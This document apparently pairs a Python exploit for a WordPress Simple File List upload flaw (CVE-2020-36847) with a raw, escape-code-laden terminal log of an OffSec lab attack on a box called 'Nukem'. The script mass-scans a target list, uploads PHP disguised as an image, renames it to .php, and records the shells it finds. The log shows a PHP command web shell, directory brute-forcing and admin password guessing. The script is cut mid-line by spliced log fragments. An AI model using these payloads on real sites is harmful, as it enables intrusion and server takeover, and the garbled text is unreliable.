+https://downloads.wordpress.org/plugin/simple-file-list.4.2.2.zip
+# Version: <= 4.2.2
+# Tested on: Ubuntu 22.04
+# CVE: CVE-2020-36847
+
+#!/usr/bin/env python3
+import requests
+import sys, os
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urljoin
+from colorama import Fore, init
+
+init(autoreset=True)
+
+HEADERS = {'User-Agent': 'Mozilla/5.0'}
+PHP_PAYLOAD = "<?php echo 'Vuln!!!'; ?>"
+UPLOAD_PATH = "wp-content/plugins/simple-file-list/ee-upload-engine.php"
+RENAME_PATH = "wp-content/plugins/simple-file-list/ee-file-engine.php"
+UPLOAD_FOLDER = "wp-content/uploads/simple-file-list/"
+
+def FilterURLS(site):
+    site = site.strip()
+    if not site.startswith(('http://', 'https://')):
+        site = 'http://' + site
+    if not site.endswith('/'):
+        site += '/'
+    return site
+
+def upload_payload(base):
+    upload_url = urljoin(base, UPLOAD_PATH)
+    try:
+        files = {'file': ('pwn.png', PHP_PAYLOAD, 'image/png')}
+        r = requests.post(upload_url, files=files, headers=HEADERS, timeout=10, verify=False)
+        r.raise_for_status()
+        result = r.json()
+        return result.get('file')
+    except Exception:
+        return None
+
+def rename_payload(base, filename):
+    rename_url = urljoin(base, RENAME_PATH)
+    try:
+        new_name = filename[:-4] + '.php'
+        data = {'oldFile': filename, 'newFile': new_name}
+        r = requests.post(rename_url, data=data, headers=H
+$ [15:27:15] echo '<?php system($_GET["cmd"]); ?>' > exploits/shell.png
+
+$ [15:27:32] curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@exploits/shell.png;type=image/png"
+EADERS, timeout=10, verify=False)
+        r.raise_for_status()
+        result = r.json()
+        return result.get('newFile')
+    except Exception:
+        return None
+
+def exploit(site):
+    base = FilterURLS(site)
+    try:
+        filename = upload_payload(base)
+        if not filename:
+            print(Fore.RED + f"[Failed] - {site}")
+            return
+
+        newfile = rename_payload(base, filename)
+        if not newfile:
+            print(Fore.RED + f"[Failed] - {site}")
+            return
+
+        shell_url = urljoin(base, UPLOAD_FOLDER + newfile)
+        r = requests.get(shell_url, headers=HEADERS, timeout=10, verify=False)
+        if r.status_code == 200:
+            print(Fore.GREEN + f"[Exploited] - {shell_url}")
+            with open("shells_found.txt", "a") as f:
+                f.write(shell_url + "\n")
+        else:
+            print(Fore.RED + f"[Failed] - {site}")
+
+    except Exception:
+        print(Fore.RED + f"[Failed] - {site}")
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} list.txt")
+        sys.exit(1)
+
+    targets_file = sys.argv[1]
+    if not os.path.isfile(targets_file):
+        print(f"File {targets_file} not found.")
+        sys.exit(1)
+
+    with open(targets_file) as f:
+        targets = [line.strip() for line in f if line.strip()]
+
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = [executor.submit(exploit, target) for target in targets]
+        for _ in as_completed(futures):
+            pass
+
+if __name__ == "__main__":
+    requests.packages.urllib3.disable_warnings()
+    main()[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:25:28][39m $ [K[?1h=[?2004hecho '<?php system($_GET["cmd"]); ?>' > exploits/shell.png[58D[32me[32mc[32mh[32mo[39m [33m'[33m<[33m?[33mp[33mh[33mp[33m [33ms[33my[33ms[33mt[33me[33mm[33m([33m$[33m_[33mG[33mE[33mT[33m[[33m"[33mc[33mm[33md[33m"[33m][33m)[33m;[33m [33m?[33m>[33m'[39m [33m>[39m[19C[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:27:15][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@exploits/shell.png;type=image/png"[K[A[2C[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mu[33mp[33ml[33mo[33ma[33md[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[131D[33m"[33mf[33mi[33ml[33me[33m=[33m@[33me[33mx[33mp[33ml[33mo[33mi[33mt[33ms[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m;[33mt[33my[33mp[33me[33m=[33mi[33mm[33ma[33mg[33me[33m/[33mp[33mn[33mg[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:27:32][39m $ [K[?1h=[?2004hcurl -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F
+$ [15:27:58] curl -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@exploits/shell.png;type=image/png"
+
+$ [15:28:17] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/"
+
+$ [15:28:41] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"
+ "file=@exploits/shell.png;type=image/png"[K[A[2C[32mc[32mu[32mr[32ml[39m[9C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mu[33mp[33ml[33mo[33ma[33md[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[128D[33m"[33mf[33mi[33ml[33me[33m=[33m@[33me[33mx[33mp[33ml[33mo[33mi[33mt[33ms[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m;[33mt[33my[33mp[33me[33m=[33mi[33mm[33ma[33mg[33me[33m/[33mp[33mn[33mg[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:27:58][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/"[60D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33m"[39m[?1l>[?2004l
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Simple File List - Put a List of Files on Your Website</title>
+<style type="text/css">
+body {
+	margin: 3em auto 0 auto;
+	max-width: 800px;
+	padding: 0;
+	text-align: center;
+}
+p {
+	font-size: 120%;
+}
+</style>
+</head>
+<body>
+	<p><a href="https://simplefilelist.com/">
+		<img src="https://simplefilelist.com/wp-content/uploads/2019/04/icon-256x256.png" title="Simple File List Logo" alt="Simple File List Logo" />
+	</a></p>
+	<h1>Simple File List<br />
+		Put a List of Files on Your Website
+	</h1>
+	<p>Simple File List is a basic Wordpress file list with optional front-side uploader. The Wordpress plugin provides an easy-to-integrate basic user interface allowing visitors, clients, customers, or associates to see a listing of your files (separate from the media library) and optionally upload files if you choose.</p>
+	<p><a href="https://simplefilelist.com/">Learn More About Simple File List</a></p>
+</body>
+</html>[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:28:17][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"[69D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m"[39m[?1l>[?2004l
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<title>Object not found!</title>
+<link rev="made" href="mailto:you@example.com" />
+<style type="text/css"><!--/*--><![CDATA[/*><!--*/ 
+    body { color: #000000; background-color: #FFFFFF; }
+    a:link { color: #0000CC; }
+    p, address {margin-left: 3em;}
+    span {font-size: smaller;}
+/*]]>*/--></style>
+</head>
+
+<body>
+<h1>Object not found!</h1>
+<p
+$ [15:32:54] curl -v -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@exploits/shell.png;type=image/png" 2>&1
+
+$ [15:33:52] curl -s "http://$BoxIP:5000/console"
+
+$ [15:34:25] curl -s "http://$BoxIP:5000/"
+>
+
+
+    The requested URL was not found on this server.
+
+  
+
+    If you entered the URL manually please check your
+    spelling and try again.
+
+  
+
+</p>
+<p>
+If you think this is a server error, please contact
+the <a href="mailto:you@example.com">webmaster</a>.
+
+</p>
+
+<h2>Error 404</h2>
+<address>
+  <a href="/">192.168.183.105</a><br />
+  <span>Apache/2.4.46 (Unix) PHP/7.4.10</span>
+</address>
+</body>
+</html>
+
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:28:42][39m $ [K[?1h=[?2004hcurl -v -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@exploits/shell.png;type=image/png" 2>&1[K[A[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mu[33mp[33ml[33mo[33ma[33md[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[131D[33m"[33mf[33mi[33ml[33me[33m=[33m@[33me[33mx[33mp[33ml[33mo[33mi[33mt[33ms[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m;[33mt[33my[33mp[33me[33m=[33mi[33mm[33ma[33mg[33me[33m/[33mp[33mn[33mg[33m"[39m [33m2[33m>[33m&[39m[1C[?1l>[?2004l
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 192.168.183.105:80...
+* Established connection to 192.168.183.105 (192.168.183.105 port 80) from 192.168.45.194 port 54834 
+* using HTTP/1.x
+> POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1
+> Host: 192.168.183.105
+> User-Agent: curl/8.20.0
+> Accept: */*
+> Content-Length: 229
+> Content-Type: multipart/form-data; boundary=------------------------9n2eOhu7ndIdjNAfGG8ao5
+> 
+* upload completely sent off: 229 bytes
+* HTTP 1.0, assume close after body
+< HTTP/1.0 500 Internal Server Error
+< Date: Thu, 27 Aug 2026 14:32:52 GMT
+< Server: Apache/2.4.46 (Unix) PHP/7.4.10
+< X-Powered-By: PHP/7.4.10
+< Content-Length: 0
+< Connection: close
+< Content-Type: text/html; charset=UTF-8
+< 
+* shutting down connection #0
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:32:54][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP:5000/console"[36D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m:[33m5[33m0[33m0[33m0[33m/[33mc[33mo[33mn[33ms[33mo[33ml[33me[33m"[39m[?1l>[?2004l
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:33:52][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP:5000/"[29D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m:[33m5[33m0[33m0[33m0[33m/[33m"[39m[?1l>[?2004l
+<!DOCTYPE HTML PUBL
+$ [15:36:03] gobuster dir -u "http://$BoxIP:5000" -w /usr/share/wordlists/dirb/common.txt -t 40 -q 2>/dev/null
+
+$ [15:36:34] curl -s "http://$BoxIP:5000/employees"
+
+$ [15:36:54] curl -s "http://$BoxIP:5000/employees?name=test"
+IC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:34:25][39m $ [K[?1h=[?2004hgobuster dir -u "http://$BoxIP:5000" -w /usr/share/wordlists/dirb/common.txt -t 40 -q 2>/dev/null[97D[32mg[32mo[32mb[32mu[32ms[32mt[32me[32mr[39m[8C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m:[33m5[33m0[33m0[33m0[33m"[39m[4C[4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me[4m/[4mw[4mo[4mr[4md[4ml[4mi[4ms[4mt[4ms[4m/[4md[4mi[4mr[4mb[4m/[4mc[4mo[4mm[4mm[4mo[4mn[4m.[4mt[4mx[4mt[24m[10C[33m2[33m>[39m[4m/[4md[4me[4mv[4m/[4mn[4mu[4ml[4ml[24m[?1l>[?2004l
+employees           [31m (Status: 500)[0m [Size: 37]
+tracks              [31m (Status: 500)[0m [Size: 37]
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:36:07][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP:5000/employees"[38D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m:[33m5[33m0[33m0[33m0[33m/[33me[33mm[33mp[33ml[33mo[33my[33me[33me[33ms[33m"[39m[?1l>[?2004l
+{"message": "Internal Server Error"}
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:36:34][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP:5000/employees?name=test"[48D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m:[33m5[33m0[33m0[33m0[33m/[33me[33mm[33mp[33ml[33mo[33my[33me[33me[33ms[33m?[33mn[33ma[33mm[33me[33m=[33mt[33me[33ms[33mt[33m"[39m[?1l>[?2004l
+{"message": "Internal Server Error"}
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:36:54][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-login.php" \
+  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \[K
+  -c /tmp/wp-cookies.txt \[K
+  -b "wordpress_test_cookie=WP+Cookie+check" \[K
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"[K[4A[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33ml[33mo[33mg[33mi[33mn[33m.[33mp[33mh[33mp[33m"[39m[1B[87D[33m"[33ml[33mo[33mg[33m=[33ma[33md[33mm[33mi[33mn[33m&[33mp[33mw[33md[33m=[33ma[33md[33mm[33mi[33mn[33m&[33mw[33mp[33m-[33ms[33mu[33mb[33mm[33mi[33mt[33m=[33mL[33mo[33mg[33m+[33mI[33mn[33m&[33mr[33me[33md[33mi[33mr[33me[33mc[33mt[33m_[33mt[33mo[33m=[33m%[33m2[33mF[33mw[33mp[33m-[33ma[33md[33mm[33mi[33mn[33m%[33m2[33mF[33m&[33mt[33me[33ms[33mt[33mc[33mo[33mo[33mk[33mi[33me[33m=[33m1[33m"
+$ [15:38:59] curl -s -X POST "http://$BoxIP/wp-login.php" \
+  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
+  -c /tmp/wp-cookies.txt \
+  -b "wordpress_test_cookie=WP+Cookie+check" \
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"
+
+$ [15:39:18] curl -s -X POST "http://$BoxIP/wp-login.php" \
+  -d "log=admin&pwd=nukem&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
+  -c /tmp/wp-cookies.txt \
+  -b "wordpress_test_cookie=WP+Cookie+check" \
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"
+[39m[2B[78D[33m"[33mw[33mo[33mr[33md[33mp[33mr[33me[33ms[33ms[33m_[33mt[33me[33ms[33mt[33m_[33mc[33mo[33mo[33mk[33mi[33me[33m=[33mW[33mP[33m+[33mC[33mo[33mo[33mk[33mi[33me[33m+[33mc[33mh[33me[33mc[33mk[33m"[39m[1B[36D[4m/[4md[4me[4mv[4m/[4mn[4mu[4ml[4ml[24m[4C[33m"[33m%[33m{[33mh[33mt[33mt[33mp[33m_[33mc[33mo[33md[33me[33m}[33m [33m%[33m{[33mu[33mr[33ml[33m_[33me[33mf[33mf[33me[33mc[33mt[33mi[33mv[33me[33m}[33m\[33mn[33m"[39m[?1l>[?2004l
+200 http://192.168.183.105/wp-login.php
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:39:00][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-login.php" \
+  -d "log=admin&pwd=nukem&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \[K
+  -c /tmp/wp-cookies.txt \[K
+  -b "wordpress_test_cookie=WP+Cookie+check" \[K
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"[K[4A[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33ml[33mo[33mg[33mi[33mn[33m.[33mp[33mh[33mp[33m"[39m[1B[87D[33m"[33ml[33mo[33mg[33m=[33ma[33md[33mm[33mi[33mn[33m&[33mp[33mw[33md[33m=[33mn[33mu[33mk[33me[33mm[33m&[33mw[33mp[33m-[33ms[33mu[33mb[33mm[33mi[33mt[33m=[33mL[33mo[33mg[33m+[33mI[33mn[33m&[33mr[33me[33md[33mi[33mr[33me[33mc[33mt[33m_[33mt[33mo[33m=[33m%[33m2[33mF[33mw[33mp[33m-[33ma[33md[33mm[33mi[33mn[33m%[33m2[33mF[33m&[33mt[33me[33ms[33mt[33mc[33mo[33mo[33mk[33mi[33me[33m=[33m1[33m"[39m[1B[78D[4m/[4mt[4mm[4mp[4m/[4mw[4mp[4m-[4mc[4mo[4mo[4mk[4mi[4me[4ms[4m.[4mt[4mx[4mt[24m[1B[19D[33m"[33mw[33mo[33mr[33md[33mp[33mr[33me[33ms[33ms[33m_[33mt[33me[33ms[33mt[33m_[33mc[33mo[33mo[33mk[33mi[33me[33m=[33mW[33mP[33m+[33mC[33mo[33mo[33mk[33mi[33me[33m+[33mc[33mh[33me[33mc[33mk[33m"[39m[1B[36D[4m/[4md[4me[4mv[4m/[4mn[4mu[4ml[4ml[24m[4C[33m"[33m%[33m{[33mh[33mt[33mt[33mp[33m_[33mc[33mo[33md[33me[33m}[33m [33m%[33m{[33mu[33mr[33ml[33m_[33me[33mf[33mf[33me[33mc[33mt[33mi[33mv[33me[33m}[33m\[33mn[33m"[39m[?1l>[?2004l
+200 http://192.168.183.105/wp-login.php
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:39:19][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-login.php" \
+  -d "log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \[K
+  -c /tmp/wp-cookies.txt \[K
+  -b "wordpress_test_cookie=WP+Cookie+check" \[K
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"[K[4A[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33ml[33mo[33mg[33mi[33mn[33m.[33mp[33mh[33mp[33m"[39m[1B[87D[33m"[33ml[33mo[33mg[33m=[33ma[33md[33mm[33mi[33mn[33m&[33mp[33mw[33md[33m=[33mp[33ma[33ms[33ms[33mw[33mo[33mr[33md[33m&[33mw[33mp[33m-[33ms[33mu[33mb[33mm[33mi[33mt[33m=[33mL[33mo[33mg[33m+[33mI[33mn[33m&[33mr[33me[33md[33mi[33mr[33me[33mc[33mt[33m_[33mt[33mo[33m=[33m%[33m2[33mF[33mw[33mp[33m-[33ma[33md[33mm[33mi[33mn[33m%[33m2[33mF[33m&[33mt[33me[33ms[33mt[33mc[33mo[33mo[33mk[33mi[33me[33m=[33m1[33m"[39m[1B[81D[4m/[4mt[4mm[4mp[4m/[4mw[4mp[4m-[4mc[4mo[4mo[4mk[4mi[4me[4ms[4m.[4mt
+$ [15:39:53] curl -s -X POST "http://$BoxIP/wp-login.php" \
+  -d "log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
+  -c /tmp/wp-cookies.txt \
+  -b "wordpress_test_cookie=WP+Cookie+check" \
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"
+
+$ [15:43:25] curl -s "http://$BoxIP/" | grep -i "eeSFL\|token\|nonce\|upload"
+
+$ [15:43:52] curl -s "http://$BoxIP/wp-json/wp/v2/pages" | python3 -m json.tool | grep -E '"link"|"slug"'
+[4mx[4mt[24m[1B[19D[33m"[33mw[33mo[33mr[33md[33mp[33mr[33me[33ms[33ms[33m_[33mt[33me[33ms[33mt[33m_[33mc[33mo[33mo[33mk[33mi[33me[33m=[33mW[33mP[33m+[33mC[33mo[33mo[33mk[33mi[33me[33m+[33mc[33mh[33me[33mc[33mk[33m"[39m[1B[36D[4m/[4md[4me[4mv[4m/[4mn[4mu[4ml[4ml[24m[4C[33m"[33m%[33m{[33mh[33mt[33mt[33mp[33m_[33mc[33mo[33md[33me[33m}[33m [33m%[33m{[33mu[33mr[33ml[33m_[33me[33mf[33mf[33me[33mc[33mt[33mi[33mv[33me[33m}[33m\[33mn[33m"[39m[?1l>[?2004l
+200 http://192.168.183.105/wp-login.php
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:39:53][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/" | grep -i "eeSFL\|token\|nonce\|upload"[64D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33m"[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m"[33me[33me[33mS[33mF[33mL[33m\[33m|[33mt[33mo[33mk[33me[33mn[33m\[33m|[33mn[33mo[33mn[33mc[33me[33m\[33m|[33mu[33mp[33ml[33mo[33ma[33md[33m"[39m[?1l>[?2004l
+var _tutorobject = {"ajaxurl":"\/wp-admin\/admin-ajax.php","nonce_key":"_wpnonce","_wpnonce":"d7efb567e6","options":{"pagination_per_page":"20","load_tutor_css":"1","load_tutor_js":"1","course_allow_upload_private_files":"1","display_course_instructors":"1","enable_q_and_a_on_course":"1","courses_col_per_row":"3","courses_per_page":"3","lesson_permalink_base":"lesson","quiz_time_limit":{"value":"0","time":"minutes"},"quiz_when_time_expires":"autosubmit","quiz_attempts_allowed":"10","quiz_grade_method":"highest_grade","enable_public_profile":"1","email_to_students":{"quiz_completed":"1","completed_course":"1"},"email_to_instructors":{"a_student_enrolled_in_course":"1","a_student_completed_course":"1","a_student_completed_lesson":"1","a_student_placed_question":"1"},"email_from_name":"Retro Gamming","email_from_address":"admin@local.host","email_footer_text":"","tutor_dashboard_page_id":5,"student_register_page":6,"instructor_register_page":7},"placeholder_img_src":"\/wp-content\/plugins\/tutor\/assets\/images\/placeholder.jpg","enable_lesson_classic_editor":"","text":{"assignment_text_validation_msg":"Assignment answer can not be empty"}};
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:43:26][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-json/wp/v2/pages" | python3 -m json.tool | grep -E '"link"|"slug"'[92D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mj[33ms[33mo[33mn[33m/[33mw[33mp[33m/[33mv[33m2[33m/[33mp[33ma[33mg[33me[33ms[33m"[39m[3C[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m[16C[32mg[32mr[32me[32mp[39m[4C[33m'[33m"[33ml[33mi[33mn[33mk[33m"[33m|[33m"[33ms[33ml[33mu[33mg[33m"[33m'[39m[?1l>[?2004l
+Expecting value: line 1 column 1 (char 0)
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:43:52][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-sitemap.xml" | grep -o '<loc>[^<]*</loc>'[67D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[
+$ [15:44:08] curl -s "http://$BoxIP/wp-sitemap.xml" | grep -o '<loc>[^<]*</loc>'
+
+$ [15:44:38] curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@exploits/shell.png;type=image/png" \
+  -F "eeSFL_ID=1" \
+  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
+  -F "eeSFL_Timestamp=1587258885" \
+  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"
+36mP[39m[33m/[33mw[33mp[33m-[33ms[33mi[33mt[33me[33mm[33ma[33mp[33m.[33mx[33mm[33ml[33m"[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m'[33m<[33ml[33mo[33mc[33m>[33m[[33m^[33m<[33m][33m*[33m<[33m/[33ml[33mo[33mc[33m>[33m'[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:44:08][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@exploits/shell.png;type=image/png" \[K
+  -F "eeSFL_ID=1" \[K
+  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \[K
+  -F "eeSFL_Timestamp=1587258885" \[K
